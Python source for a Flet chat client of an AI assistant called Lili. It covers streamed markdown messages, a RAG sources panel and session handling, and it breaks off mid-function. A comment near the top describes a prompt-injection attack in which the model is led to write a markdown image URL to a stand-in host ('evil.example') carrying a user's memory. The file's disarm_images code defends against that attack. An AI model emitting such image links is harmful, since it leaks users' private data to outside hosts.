from __future__ import annotations

"""Chat view components for interacting with the AI agent."""

import asyncio
import logging
import re
import time
import uuid
from collections.abc import Callable
from pathlib import Path

import flet as ft
import httpx

from api.client import APIClient, APIError, ChatAttachment, Proposal, StreamError
from state.settings import DEFAULT_DISPLAY_NAME, Settings, load_settings, save_settings
from views.attachments import (
    MAX_FILE_BYTES,
    MESSAGE_TOKEN_LIMIT,
    PASTE_THRESHOLD_CHARS,
    NotAttachable,
    estimate_message_tokens,
    inserted_text,
    paste_file_name,
    read_text_file,
)
from views.emoji_picker import EmojiPicker
from views.proposals import ProposalCard
from views.ui_utils import confirm_dialog, describe_error, safe_update, show_snackbar

logger = logging.getLogger(__name__)

DEBUG_MOCK_SOURCES = False

# Flet 0.24 ListView is not virtualised, so rendering a very long history means
# building hundreds of markdown widgets. Only the tail is rendered.
HISTORY_PAGE_SIZE = 100
# One message more than is shown: its presence is how load_history knows that
# older messages exist (the backend returns the newest N, oldest first).
HISTORY_REQUEST_LIMIT = HISTORY_PAGE_SIZE + 1
# Upper bound of control updates per second while a response is streaming.
# Each flush is a tree walk plus a synchronous round trip to the Flutter client.
STREAM_FLUSH_INTERVAL = 0.12
# How long the stream may stay silent before the "..." indicator is shown again.
ACTIVITY_INDICATOR_DELAY = 1.0
# While an answer streams the chat keeps its end in view, but only as long as the
# reader is at the bottom (within BOTTOM_FOLLOW_THRESHOLD px of it): scrolling up
# to re-read something must not be undone by the next chunk. The ListView reports
# its position at most every SCROLL_EVENT_INTERVAL ms.
BOTTOM_FOLLOW_THRESHOLD = 40
SCROLL_EVENT_INTERVAL = 50
# The client lays a text update out on its next frame, after a scroll_to sent
# together with it was already handled - so the scroll goes out this long
# (seconds) after the text, which also caps it at a few scrolls per second.
SCROLL_SETTLE_DELAY = 0.15


# --------------------------------------------------- images in Lili's answers
# The Markdown control fetches an image as soon as it is drawn, without a click.
# Text from a web page or a book (prompt injection) could make the model write
# ![](https://evil.example/?d=<a memory>) and the data would leave on display.
# So in her answers every image becomes an ordinary link, opened only by a click
# (and only for http/https/mailto, see ChatMessage._open_link).
#
# The rule that keeps it safe: no "![" and no "<img" is left anywhere in what is
# drawn. Telling code from prose only decides how a broken image LOOKS - outside
# code it becomes a visible link, inside code "!" and "[" are split by an
# invisible word joiner, so the code looks the same. A wrong guess about code
# (the public repo shows the parser to anyone) costs looks, never a fetch.
IMAGE_MARK = "🖼"
WORD_JOINER = "⁠"
_FENCE = re.compile(r"^[ \t]{0,3}(`{3,}|~{3,})")
_CODE_SPAN = re.compile(r"(`+)(?!`)(.+?)(?<!`)\1(?!`)", re.DOTALL)
_IMG_TAG = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
_IMG_OPEN = re.compile(r"<(img)", re.IGNORECASE)
_TAG_ATTR = r"""\b{name}\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"""


def disarm_images(markdown: str) -> str:
    """Turn the images of ``markdown`` into links, so nothing is fetched unasked.

    ``![alt](url)`` becomes ``[🖼 alt](url)``, ``![alt][ref]`` a reference link,
    an ``<img src=...>`` tag a link to its ``src``. In fenced code blocks and
    inline code an image is text: there it is only split invisibly.
    """
    if "![" not in markdown and "<img" not in markdown.lower():
        return markdown
    shown = "".join(
        _split_quietly(part) if is_code else _disarm_prose(part)
        for is_code, part in _fenced_parts(markdown)
    )
    # The net under everything above: whatever slipped through is split too.
    return _split_quietly(shown)


def _split_quietly(text: str) -> str:
    """Break every ``![`` and ``<img`` with an invisible character."""
    text = text.replace("![", f"!{WORD_JOINER}[")
    return _IMG_OPEN.sub(lambda m: f"<{WORD_JOINER}{m.group(1)}", text)


def _fenced_parts(text: str):
    """Yield ``(is_code, text)``: the fenced code blocks and what lies between them.

    A fence that is still open (the answer is being streamed) runs to the end,
    as the Markdown control draws it.
    """
    buffer: list[str] = []
    fence: str | None = None
    for line in text.splitlines(keepends=True):
        opener = _FENCE.match(line)
        if fence is None:
            # A ``` fence whose info string holds a backtick is no fence.
            if opener and not (opener.group(1)[0] == "`" and "`" in line[opener.end():]):
                if buffer:
                    yield False, "".join(buffer)
                buffer = [line]
                fence = opener.group(1)
            else:
                buffer.append(line)
        else:
            buffer.append(line)
            closing = opener and opener.group(1)[0] == fence[0] and len(opener.group(1)) >= len(fence)
            if closing and not line.strip().strip(fence[0]):
                yield True, "".join(buffer)
                buffer = []
                fence = None
    if buffer:
        yield fence is not None, "".join(buffer)


def _disarm_prose(text: str) -> str:
    out: list[str] = []
    position = 0
    for span in _CODE_SPAN.finditer(text):
        out.append(_disarm_plain(text[position:span.start()]))
        out.append(_split_quietly(span.group(0)))
        position = span.end()
    out.append(_disarm_plain(text[position:]))
    return "".join(out)


def _tag_attribute(tag: str, name: str) -> str:
    found = re.search(_TAG_ATTR.format(name=name), tag, re.IGNORECASE)
    return next((group for group in found.groups() if group is not None), "") if found else ""


def _img_tag_as_link(match: re.Match) -> str:
    tag = match.group(0)
    alt = _tag_attribute(tag, "alt").replace("[", "(").replace("]", ")").strip()
    src = _tag_attribute(tag, "src").strip()
    label = f"{IMAGE_MARK} {alt}".strip()
    if not src:
        return label
    for char, code in ((" ", "%20"), ("(", "%28"), (")", "%29")):
        src = src.replace(char, code)
    # The joiner first: a "!" just before the tag must not turn the link into
    # an image again.
    return f"{WORD_JOINER}[{label}]({src})"


def _disarm_plain(text: str) -> str:
    text = _IMG_TAG.sub(_img_tag_as_link, text)
    out: list[str] = []
    position = 0
    while (start := text.find("![", position)) != -1:
        backslashes = len(text[:start]) - len(text[:start].rstrip("\\"))
        out.append(text[position:start])
        if backslashes % 2:
            # "\![" is an escaped "!" followed by a link: it stays as it is shown.
            out.append(f"!{WORD_JOINER}[")
        else:
            # The joiner keeps a "!" written just before ("!![x](u)") from making
            # a new image out of the link.
            out.append(f"{WORD_JOINER}[{IMAGE_MARK} ")
        position = start + 2
    out.append(text[position:])
    return "".join(out)


def _get_mock_sources():
    return [
        {"title": "guidelines.pdf", "type": "Документ", "score": "95", "text_snippet": "Това е първият пример за намерен текст от документа guidelines.pdf."},
        {"title": "receipt_123.jpg", "type": "OCR", "score": "82", "text_snippet": "Извлечен текст от касова бележка. Сума: 12.50 BGN"},
        {"title": "manual.docx", "type": "Документ", "score": "78", "text_snippet": "Важно упътване от файла manual.docx относно инсталацията."},
        {"title": "notes.txt", "type": "Документ", "score": "60", "text_snippet": "Някакви случайни записки, които са намерени от RAG системата."},
        {"title": "screenshot.png", "type": "OCR", "score": "45", "text_snippet": "Текст от екранна снимка на браузър."},
    ]


# What the backend's ``source_type`` is called in the sources panel.
SOURCE_TYPE_LABELS = {
    "memory": "Памет",
    "concept": "Концепция",
    "text": "Текст",
    "ocr": "OCR",
}
# How the backend's ``score_type`` is called next to the score. ``distance`` is not
# here: it is shown as a distance, not as a percentage (see ``source_details``).
SCORE_TYPE_LABELS = {
    "cosine": "косинусово",
    "rrf": "RRF",
}
DISTANCE_SCORE_TYPE = "distance"
DEFAULT_SOURCE_LABEL = "Документ"


def source_type_label(source_type) -> str:
    """The panel's name of a ``source_type``; an unknown one is shown as it came."""
    key = str(source_type).strip() if source_type else ""
    if not key:
        return DEFAULT_SOURCE_LABEL
    return SOURCE_TYPE_LABELS.get(key.lower(), key)


def format_source_score(score, score_type=None) -> str:
    """Format a source's score for the panel.

    A ``distance`` is the cosine distance between the question and the source: a
    number of about 0.1-0.2 that is shown with three decimals, not as a percentage
    (with the embedding model in use even unrelated texts are at 0.15-0.30, which
    as ``(1 - distance) * 100`` looked like an 82-85 % match). The other types come
    on a 0-100 scale (older backends multiplied cosine scores by 100, RRF ones are
    normalised), so the number is shown as it is - this client used to guess the
    scale and turned a real 0.8 % into 80 %. A value that is not a number is shown
    as text.
    """
    kind = str(score_type).strip() if score_type else ""
    is_distance = kind.lower() == DISTANCE_SCORE_TYPE
    try:
        text = f"{float(score):.3f}" if is_distance else f"{float(score):.1f}%"
    except (ValueError, TypeError) as e:
        logger.warning("Failed to convert score '%s' to float: %s", score, e)
        text = str(score)
    if is_distance:
        return text
    if not kind:
        return text
    return f"{text} ({SCORE_TYPE_LABELS.get(kind.lower(), kind)})"


def source_details(src: dict) -> str:
    """The grey line under a source's title: type, page (if known) and score."""
    parts = [source_type_label(src.get("source_type") or src.get("type"))]
    page_number = src.get("page_number")
    if page_number not in (None, ""):
        parts.append(f"стр. {page_number}")
    score = src.get("score", "N/A")
    score_type = src.get("score_type")
    if str(score_type or "").strip().lower() == DISTANCE_SCORE_TYPE:
        parts.append(f"Разстояние: {format_source_score(score, score_type)} (по-малко = по-близо)")
    elif score_type or score != 0:
        parts.append(f"Сходство: {format_source_score(score, score_type)}")
    # else: a source without a measure (a recalled memory) shows no score at all
    return "• " + " • ".join(parts)


class ChatMessage(ft.Column):
    """A component representing a single chat message in the UI."""

    def __init__(self, role: str, text: str, sources: list | None = None, page: ft.Page | None = None, on_regenerate: callable | None = None, api_client: APIClient | None = None, user_name: str = DEFAULT_DISPLAY_NAME):
        super().__init__()
        self.role = role
        self.api_client = api_client
        self.text_value = text
        self.sources = sources or []
        self.page_ref = page
        self.on_regenerate = on_regenerate
        self.spacing = 2
        self.horizontal_alignment = ft.CrossAxisAlignment.END if role == "user" else ft.CrossAxisAlignment.START

        self.text_color = ft.colors.LIGHT_BLUE_200 if role == "user" else ft.colors.PINK_200
        self.sender_name = user_name if role == "user" else "Лили"
        self.bgcolor = ft.colors.BLUE_GREY_800 if role == "user" else ft.colors.BLUE_GREY_900

        self.md = ft.Markdown(
            value=self._shown(self.text_value),
            selectable=True,
            extension_set=ft.MarkdownExtensionSet.GITHUB_WEB,
            code_theme="atom-one-dark",
            on_tap_link=self._open_link,
            md_style_sheet=ft.MarkdownStyleSheet(
                p_text_style=ft.TextStyle(color=self.text_color),
            )
        )

        self.msg_container = ft.Container(
            content=self.md,
            padding=10,
            border_radius=10,
            bgcolor=self.bgcolor,
        )

        self.sender_label = ft.Text(
            value=self.sender_name,
            size=12,
            color=ft.colors.GREY_500,
        )

        self.copy_btn = ft.IconButton(
            icon=ft.icons.COPY,
            icon_size=14,
            tooltip="Копирай",
            on_click=self.copy_to_clipboard,
        )

        top_controls = [self.sender_label, self.copy_btn]
        if role != "user":
            self.regenerate_btn = ft.IconButton(icon=ft.icons.REFRESH, icon_size=14, tooltip="Опитай отново", on_click=self._handle_regenerate, visible=False)
            top_controls.append(self.regenerate_btn)

        self.top_row = ft.Row(
            controls=top_controls,
            alignment=ft.MainAxisAlignment.START,
        )

        self.sources_row = ft.Row(wrap=True, visible=False)
        # Writes the assistant proposed in this turn; they wait for the user.
        self.proposals_column = ft.Column(spacing=4, visible=False)
        self._proposal_ids: set[int] = set()
        self.bottom_sheet = None
        self.activity_indicator = ft.Text("...", size=20, color=ft.colors.GREY_500, visible=False)
        self.error_text = ft.Text("", color=ft.colors.RED, selectable=True, visible=False)

        self.controls = [
            self.top_row,
            self.msg_container,
            self.error_text,
            self.activity_indicator,
            self.sources_row,
            self.proposals_column,
        ]

    def did_mount(self):
        if self.sources:
            self.add_sources(self.sources)

    def _shown(self, text: str) -> str:
        """What the Markdown control draws: Lili's images only as links."""
        return text if self.role == "user" else disarm_images(text)

    def _open_link(self, e):
        """Open only web/mail links, never arbitrary URL schemes."""
        url = (getattr(e, "data", None) or "").strip()
        if not url.lower().startswith(("http://", "https://", "mailto:")):
            logger.warning("Blocked non-http link: %s", url)
            return
        if self.page_ref is not None:
            self.page_ref.launch_url(url)

    async def _handle_regenerate(self, e):
        if self.on_regenerate and self.page_ref:
            self.page_ref.run_task(self.on_regenerate)

    def set_regenerate_visible(self, visible: bool):
        if hasattr(self, "regenerate_btn"):
            self.regenerate_btn.visible = visible
            # Only the button is re-sent, not the whole markdown block.
            safe_update(self, self.regenerate_btn)

    def show_activity_indicator(self):
        if not self.activity_indicator.visible:
            self.activity_indicator.visible = True
            safe_update(self, self.activity_indicator)

    def hide_activity_indicator(self):
        if self.activity_indicator.visible:
            self.activity_indicator.visible = False
            safe_update(self, self.activity_indicator)

    def finalize_with_error(self, error_msg: str):
        """Show ``error_msg`` as its own red line under the message.

        The body is Markdown, which does not render inline HTML: the former
        ``<span style='color:red;'>`` was displayed as raw tags.
        """
        self.error_text.value = error_msg
        self.error_text.visible = True
        self.hide_activity_indicator()
        safe_update(self, self.error_text)

    def add_proposals(self, proposals: list):
        """Show a card for each write the assistant proposed in this turn.

        Entries the backend sent in an unexpected shape are skipped, and so is a
        proposal that already has its card (a regenerated answer repeats it).
        """
        if not proposals or self.api_client is None:
            return

        added = False
        for item in proposals:
            try:
                proposal = Proposal(**item) if isinstance(item, dict) else None
            except ValueError as ex:
                logger.warning("Ignoring a malformed proposal: %s", ex)
                continue
            if proposal is None or proposal.id in self._proposal_ids:
                continue
            self._proposal_ids.add(proposal.id)
            self.proposals_column.controls.append(
                ProposalCard(proposal, self.api_client, page=self.page_ref)
            )
            added = True

        if added:
            self.proposals_column.visible = True
            safe_update(self, self.proposals_column)

    async def copy_to_clipboard(self, e):
        if self.page_ref:
            # The text as it was written, images included.
            self.page_ref.set_clipboard(self.text_value)
            self.page_ref.open(
                ft.SnackBar(
                    content=ft.Text("Копирано"),
                    duration=2000,
                )
            )

    def append_text(self, text: str):
        """Append streamed text; only the Markdown control is sent to the client.

        The whole text is disarmed again, not the new piece: a chunk can end in
        the middle of ``![alt](url)``.
        """
        self.text_value += text
        self.md.value = self._shown(self.text_value)
        safe_update(self, self.md)

    @staticmethod
    def _source_key(source) -> tuple:
        if not isinstance(source, dict):
            return (str(source), "")
        return (
            source.get("title") or source.get("file_name") or "Unknown",
            source.get("content_snippet")
            or source.get("text_snippet")
            or source.get("text")
            or "",
        )

    def add_sources(self, sources: list):
        if not sources:
            return

        if sources is not self.sources:
            known = {self._source_key(src) for src in self.sources}
            new_sources = [src for src in sources if self._source_key(src) not in known]
            if not new_sources:
                # The same references arrived twice - nothing to redraw.
                return
            self.sources.extend(new_sources)

        self.sources_row.controls.clear()
        self.sources_row.controls.append(ft.Text("Източници:", size=12, color=ft.colors.GREY_400))

        # Group sources by filename
        grouped_sources = {}
        for src in self.sources:
            if isinstance(src, dict):
                title = src.get("title") or src.get("file_name") or "Unknown"
            else:
                title = "Unknown"
            grouped_sources.setdefault(title, []).append(src)

        for title, file_sources in grouped_sources.items():
            count = len(file_sources)
            label_text = f"{title} ({count})" if count > 1 else title
            short_label = (label_text[:20] + "..") if len(label_text) > 20 else label_text

            chip = ft.Chip(
                label=ft.Text(short_label, size=12),
                leading=ft.Icon(ft.icons.INSERT_DRIVE_FILE, size=14),
                on_click=lambda e, file_sources=file_sources: self.open_sources_panel(file_sources),
            )
            self.sources_row.controls.append(chip)

        self.sources_row.visible = True
        if self.sources_row.uid is not None:
            safe_update(self, self.sources_row)
        else:
            # First paint (e.g. called from did_mount): send the whole message.
            safe_update(self)

    def open_sources_panel(self, sources_to_display: list | None = None):
        if not self.page_ref:
            return

        display_list = sources_to_display if sources_to_display is not None else self.sources

        list_view = ft.ListView(expand=True, spacing=10, padding=20)

        list_view.controls.append(ft.Text("Източници (RAG)", size=20, weight=ft.FontWeight.BOLD))

        for src in display_list:
            if not isinstance(src, dict):
                src = {"title": str(src)}
            title = src.get("title") or src.get("file_name") or "Unknown"
            snippet = src.get("content_snippet") or src.get("text_snippet") or src.get("text") or ""

            item = ft.Container(
                content=ft.Column([
                    ft.Row([
                        ft.Text(title, weight=ft.FontWeight.BOLD, size=16),
                        ft.Text(source_details(src), size=12, color=ft.colors.GREY_400)
                    ]),
                    ft.Text(snippet, selectable=True, size=14, color=ft.colors.GREY_300)
                ]),
                bgcolor=ft.colors.BLUE_GREY_900,
                padding=15,
                border_radius=10,
                border=ft.border.all(1, ft.colors.BLUE_GREY_700)
            )
            list_view.controls.append(item)

        if self.bottom_sheet is not None:
            self.page_ref.close(self.bottom_sheet)

        self.bottom_sheet = ft.BottomSheet(
            content=ft.Container(
                content=list_view,
                padding=10,
                height=400,
            ),
            open=True
        )
        self.page_ref.open(self.bottom_sheet)


CHAT_SESSION_PREFIX = "Чат"


def _next_chat_name(chat_sessions: list[dict]) -> str:
    """Return the first unused "Чат N" label for a brand new chat."""
    used = {session["name"] for session in chat_sessions}
    index = 1
    while f"{CHAT_SESSION_PREFIX} {index}" in used:
        index += 1
    return f"{CHAT_SESSION_PREFIX} {index}"


def _unique_chat_name(name: str, chat_sessions: list[dict]) -> str:
    """Return a label that no other chat session is using yet."""
    name = (name or "").strip()
    if not name:
        return _next_chat_name(chat_sessions)

    used = {session["name"] for session in chat_sessions}
    if name not in used:
        return name

    index = 2
    while f"{name} ({index})" in used:
        index += 1
    return f"{name} ({index})"


def _normalize_chat_sessions(settings: Settings) -> list[dict]:
    """Return ``settings.chat_sessions`` as clean ``{"id", "name"}`` entries.

    Older builds persisted bare names and a broken write can leave entries
    without an id. Such entries are re-bound to ``settings.session_id`` when
    that id is not listed yet, so an already existing chat stays reachable
    instead of being replaced by a freshly generated session id.
    """
    chat_sessions: list[dict] = []
    used_ids: set[str] = set()
    nameless_entries: list[dict] = []

    for entry in settings.chat_sessions or []:
        if isinstance(entry, str):
            entry = {"name": entry}
        if not isinstance(entry, dict):
            continue

        raw_id = entry.get("id") or entry.get("session_id")
        session_id = str(raw_id).strip() if raw_id else ""
        name = str(entry.get("name") or entry.get("title") or "").strip()

        if not session_id:
            # Without an id the entry cannot address a session; keep its name
            # around in case it belongs to the still active session.
            nameless_entries.append({"name": name})
            continue
        if session_id in used_ids:
            continue

        used_ids.add(session_id)
        chat_sessions.append(
            {"id": session_id, "name": _unique_chat_name(name, chat_sessions)}
        )

    active_id = (settings.session_id or "").strip()
    if active_id and active_id not in used_ids:
        # The active session predates `chat_sessions` (or lost its entry):
        # keep it and reuse the name of a legacy entry when there is one.
        name = nameless_entries.pop(0)["name"] if nameless_entries else ""
        chat_sessions.append(
            {"id": active_id, "name": _unique_chat_name(name, chat_sessions)}
        )

    return chat_sessions


def _resolve_session_id(chat_sessions: list[dict], selected: str | None) -> str | None:
    """Map a dropdown value (session id or chat name) to a saved session id."""
    value = (selected or "").strip()
    if not value:
        return None

    for session in chat_sessions:
        if session["id"] == value:
            return session["id"]
    for session in chat_sessions:
        if session["name"].casefold() == value.casefold():
            return session["id"]
    return None


def _restart_chat_session(settings: Settings, session_id: str) -> str | None:
    """Start ``session_id`` over: the same chat in the list, with a new empty session.

    The chat keeps its name and its place in the list, but now points at a fresh
    session id, so the conversation starts empty. This is the local half of
    deleting a chat: the caller deletes the old session on the backend first
    (``APIClient.delete_session``), which also leaves the user's long-term memory
    (it belongs to ``user_id``, not to a chat) alone. Nothing is archived any more:
    there is no history left to find. ``settings.archived_chats`` only keeps the
    entries that earlier versions wrote there.

    Returns the new session id, or ``None`` when ``session_id`` is not in the
    list (nothing is changed then).
    """
    chat_sessions = _normalize_chat_sessions(settings)
    index = next(
        (i for i, session in enumerate(chat_sessions) if session["id"] == session_id),
        None,
    )
    if index is None:
        return None

    old = chat_sessions[index]
    new_id = str(uuid.uuid4())
    chat_sessions[index] = {"id": new_id, "name": old["name"]}
    settings.chat_sessions = chat_sessions
    settings.session_id = new_id
    return new_id


def _ensure_chat_session(settings: Settings) -> tuple[str, list[dict]]:
    """Resolve the session the chat view must open and repair stale settings.

    A saved ``chat_sessions`` entry always wins over generating an id: a new
    UUID is created only when the settings hold no chat at all.
    """
    previous_sessions = settings.chat_sessions
    previous_session_id = settings.session_id

    chat_sessions = _normalize_chat_sessions(settings)
    if chat_sessions:
        active_id = (previous_session_id or "").strip()
        if not any(session["id"] == active_id for session in chat_sessions):
            # `session_id` is missing or points nowhere - open the first chat
            # that is actually stored instead of inventing a new one.
            active_id = chat_sessions[0]["id"]
    else:
        # No chat was ever saved (first run): the only case that mints an id.
        active_id = (previous_session_id or "").strip() or str(uuid.uuid4())
        chat_sessions = [{"id": active_id, "name": _next_chat_name(chat_sessions)}]

    if chat_sessions != previous_sessions or active_id != previous_session_id:
        settings.chat_sessions = chat_sessions
        settings.session_id = active_id
        save_settings(settings)
    return active_id, chat_sessions


class ChatView(ft.Container):
    """The main view for the chat interface."""

    def __init__(
        self,
        page: ft.Page,
        api_client: APIClient,
        on_session_changed: Callable[[str], None] | None = None,
    ):
        super().__init__()
        self.page = page
        self.api_client = api_client
        self.on_session_changed = on_session_changed

        # Never mint a new id while a saved chat exists: the dropdown has to
        # keep pointing at the session ids stored in settings.json.
        settings = load_settings()
        self.session_id, chat_sessions = _ensure_chat_session(settings)
        # How the user's own messages are labelled (the ``display_name`` setting).
        self.display_name = settings.display_name

        self._stop_generation = False
        self._is_streaming = False
        self._last_assistant_msg = None
        self._last_assistant_row = None
        self._load_task = None
        self._attachments_task = None
        # The files attached to the open conversation, newest first.
        self.attachments: list[ChatAttachment] = []
        # What the input field held at the last change: a jump of thousands of
        # characters in one change is a paste (see on_input_change).
        self._input_text = ""
        self._offering = False
        # False once the reader scrolled up; see _on_chat_scroll.
        self._follow_bottom = True
        # True while a _scroll_after_layout task is waiting to scroll.
        self._scroll_pending = False

        self.expand = True

        self.chat_list = ft.ListView(
            expand=True,
            spacing=10,
            auto_scroll=False,
            padding=ft.padding.only(left=20, right=20),
            on_scroll=self._on_chat_scroll,
            on_scroll_interval=SCROLL_EVENT_INTERVAL,
        )

        self.new_chat_btn = ft.IconButton(
            icon=ft.icons.ADD_COMMENT,
            tooltip="Нов чат",
            on_click=self.on_new_chat_click,
        )

        self.delete_chat_btn = ft.IconButton(
            icon=ft.icons.DELETE_OUTLINE,
            tooltip="Изтрий разговора (чатът остава, празен)",
            on_click=self.on_delete_chat_click,
        )

        self.session_dropdown = ft.Dropdown(
            options=[
                ft.dropdown.Option(key=session["id"], text=session["name"])
                for session in chat_sessions
            ],
            value=self.session_id,
            width=200,
            on_change=self.on_session_change,
        )

        self.top_row = ft.Row(
            controls=[
                self.session_dropdown,
                ft.Row([self.delete_chat_btn, self.new_chat_btn], spacing=0),
            ],
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
        )

        self.input_field = ft.TextField(
            hint_text="Напиши съобщение...",
            autofocus=True,
            shift_enter=True,
            min_lines=1,
            max_lines=5,
            expand=True,
            on_submit=self.send_message_click,
            on_change=self.on_input_change,
        )

        self.file_picker = ft.FilePicker(on_result=self.on_attach_result)
        self.attach_btn = ft.IconButton(
            icon=ft.icons.ATTACH_FILE,
            tooltip="Прикачи файл към този разговор (код, лог, текст)",
            on_click=self.on_attach_click,
        )
        # The files of this conversation, with a cross to take one away.
        self.attachments_row = ft.Row(wrap=True, spacing=6, run_spacing=4, visible=False)

        self.send_btn = ft.IconButton(
            icon=ft.icons.SEND,
            tooltip="Изпрати",
            on_click=self.send_message_click,
        )

        self.stop_btn = ft.IconButton(
            icon=ft.icons.STOP,
            icon_color=ft.colors.RED,
            tooltip="Спри",
            visible=False,
            on_click=self.stop_generation_click,
        )

        self.emoji_picker = EmojiPicker(on_pick=self.insert_emoji)
        self.emoji_btn = ft.IconButton(
            icon=ft.icons.EMOJI_EMOTIONS_OUTLINED,
            tooltip="Емоджита",
            on_click=self.toggle_emoji_picker,
        )

        input_row = ft.Row(
            controls=[self.input_field, self.attach_btn, self.emoji_btn, self.stop_btn, self.send_btn],
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
            vertical_alignment=ft.CrossAxisAlignment.END,
        )

        self.content = ft.Column(
            controls=[
                self.top_row,
                self.chat_list,
                self.emoji_picker,
                self.attachments_row,
                input_row,
            ],
            expand=True,
        )

    # ------------------------------------------------------------------ state
    def _reset_conversation(self):
        """Drop everything that points at the previous session."""
        self._stop_generation = True
        self._last_assistant_msg = None
        self._last_assistant_row = None
        self._follow_bottom = True
        self.chat_list.controls.clear()
        # The files of the other conversation are not this one's.
        self.attachments = []
        self._render_attachments()
        safe_update(self)

    def _cancel_running_tasks(self):
        self.api_client.cancel_stream()
        if self._load_task is not None:
            self._load_task.cancel()
            self._load_task = None
        if self._attachments_task is not None:
            self._attachments_task.cancel()
            self._attachments_task = None

    def _set_streaming_ui(self, streaming: bool):
        self.send_btn.visible = not streaming
        self.stop_btn.visible = streaming
        self.stop_btn.disabled = False
        # Removing a chat would cut the answer that is being written into it.
        self.delete_chat_btn.disabled = streaming
        safe_update(self, self.send_btn, self.stop_btn, self.delete_chat_btn)

    def _apply_session_options(self, chat_sessions: list[dict], selected_id: str | None) -> None:
        """Re-key the dropdown so every option points at a real session id."""
        self.session_dropdown.options = [
            ft.dropdown.Option(key=session["id"], text=session["name"])
            for session in chat_sessions
        ]
        self.session_dropdown.value = selected_id
        safe_update(self, self.session_dropdown)

    def _notify_session_changed(self, session_id: str) -> None:
        """Tell the hosting app to reload the views tied to the active chat."""
        if self.on_session_changed is None:
            return
        try:
            self.on_session_changed(session_id)
        except Exception as ex:  # noqa: BLE001
            logger.warning("Session change listener failed: %s", ex)

    def _activate_session(self, session_id: str, reload_history: bool = True) -> None:
        """Point the view at ``session_id`` and reload what belongs to it."""
        self.session_id = session_id
        self._reset_conversation()
        self._cancel_running_tasks()
        if reload_history and self.page is not None:
            # The files first, the history last: the history is what the view waits for.
            self._attachments_task = self.page.run_task(self.load_attachments)
            self._load_task = self.page.run_task(self.load_history)
        self._notify_session_changed(session_id)

    async def on_session_change(self, e):
        """Open the chat the user picked, always with its saved session id.

        The dropdown is keyed by session id, but the selected value is resolved
        against ``settings.json`` first (by id, then by chat name) so that a
        legacy name-keyed option or an entry without an id still maps back to
        the session that owns the history, memories and files. A new UUID is
        generated only for a chat that is not stored yet.
        """
        event_control = getattr(e, "control", None)
        selected = getattr(event_control, "value", None) or self.session_dropdown.value
        if not selected:
            return

        settings = load_settings()
        chat_sessions = _normalize_chat_sessions(settings)
        session_id = _resolve_session_id(chat_sessions, selected)

        if session_id is None:
            # A chat that was never persisted: the only legitimate new id.
            session_id = str(uuid.uuid4())
            chat_sessions.append(
                {"id": session_id, "name": _unique_chat_name(str(selected), chat_sessions)}
            )

        settings.chat_sessions = chat_sessions
        settings.session_id = session_id
        if not save_settings(settings):
            # The chat still opens, but after a restart the app would forget it.
            show_snackbar(self.page, "Неуспешно запазване на настройките.")

        # Re-sync the widget as well: it may have carried a chat name instead
        # of an id, and the options must stay keyed by the saved ids.
        self._apply_session_options(chat_sessions, session_id)

        if session_id == self.session_id:
            return

        self._activate_session(session_id)

    async def on_new_chat_click(self, e):
        settings = load_settings()
        chat_sessions = _normalize_chat_sessions(settings)

        new_session = str(uuid.uuid4())
        chat_sessions.append({"id": new_session, "name": _next_chat_name(chat_sessions)})

        settings.chat_sessions = chat_sessions
        settings.session_id = new_session
        if not save_settings(settings):
            # The chat still opens, but after a restart the app would forget it.
            show_snackbar(self.page, "Неуспешно запазване на настройките.")
        logger.info("New chat %s started.", new_session[:8])

        self._apply_session_options(chat_sessions, new_session)
        # A brand new chat has no history to fetch, so only the UI is cleared.
        self._activate_session(new_session, reload_history=False)

    async def on_delete_chat_click(self, e):
        """Delete the open chat's conversation for good and stay in the chat, empty.

        The conversation is deleted on the backend first (messages, summary,
        attached files; the long-term memories stay). If that fails nothing
        changes and the user can try again; asking twice is safe. Then the chat
        keeps its name and its place in the list and continues as a new empty
        session (see ``_restart_chat_session``).
        """
        if self._is_streaming:
            show_snackbar(self.page, "Изчакай края на отговора или го спри, преди да изтриеш чата.")
            return

        name = next(
            (opt.text for opt in self.session_dropdown.options if opt.key == self.session_id),
            "Този чат",
        )
        confirmed = await confirm_dialog(
            self.page,
            "Изтриване на чата",
            f"Разговорът в „{name}“ ще бъде изтрит завинаги: съобщенията, "
            "резюмето и прикачените файлове. Чатът остава в списъка, но празен. "
            "Спомените на Лили за теб (дългосрочната памет) не се пипат.",
            confirm_text="Изтрий",
        )
        if not confirmed:
            return

        old_id = self.session_id
        try:
            await self.api_client.delete_session(old_id)
        except asyncio.CancelledError:
            raise
        except Exception as ex:  # noqa: BLE001
            logger.error("Failed to delete chat %s on the backend: %s", old_id[:8], ex)
            show_snackbar(self.page, f"Разговорът не беше изтрит, чатът е непроменен. {describe_error(ex)}")
            return

        # Read after the dialog and the call: the settings may have been saved meanwhile.
        settings = load_settings()
        new_id = _restart_chat_session(settings, old_id)
        if new_id is None:
            return

        if not save_settings(settings):
            show_snackbar(self.page, "Неуспешно запазване на настройките.")
            return
        logger.info("Chat %s was deleted on the backend, it continues as session %s.", old_id[:8], new_id[:8])

        self._apply_session_options(settings.chat_sessions, new_id)
        # The new session has no history to fetch, so only the screen is cleared.
        self._activate_session(new_id, reload_history=False)
        show_snackbar(
            self.page,
            "Разговорът е изтрит. Спомените са запазени.",
            success=True,
        )

    def scroll_to_bottom(self):
        """Jump to the newest message and follow what is appended after it."""
        self._follow_bottom = True
        if self.chat_list.uid is not None:
            self.chat_list.scroll_to(offset=-1, duration=100)
        # New rows are laid out on the client's next frame, after this scroll.
        self._follow_stream()

    def _follow_stream(self):
        """Keep the end of a growing answer in view, unless the reader left it.

        ``ListView.auto_scroll`` is off on purpose: it only reacts when the list
        itself is rebuilt (streamed text updates just the Markdown control, so an
        answer grew past the bottom edge unseen), and once our own scroll_to
        rebuilt the list it animated slowly against it, leaving the end 1-2 lines
        out of view. The scroll is deferred (see SCROLL_SETTLE_DELAY) and at most
        one is waiting at any time.
        """
        if self._scroll_pending or not self._follow_bottom or self.page is None:
            return
        self._scroll_pending = True
        self.page.run_task(self._scroll_after_layout)

    async def _scroll_after_layout(self):
        try:
            await asyncio.sleep(SCROLL_SETTLE_DELAY)
        finally:
            self._scroll_pending = False
        if self._follow_bottom and self.chat_list.uid is not None:
            self.chat_list.scroll_to(offset=-1)

    def _on_chat_scroll(self, e: ft.OnScrollEvent):
        """Track whether the reader is at the bottom of the conversation.

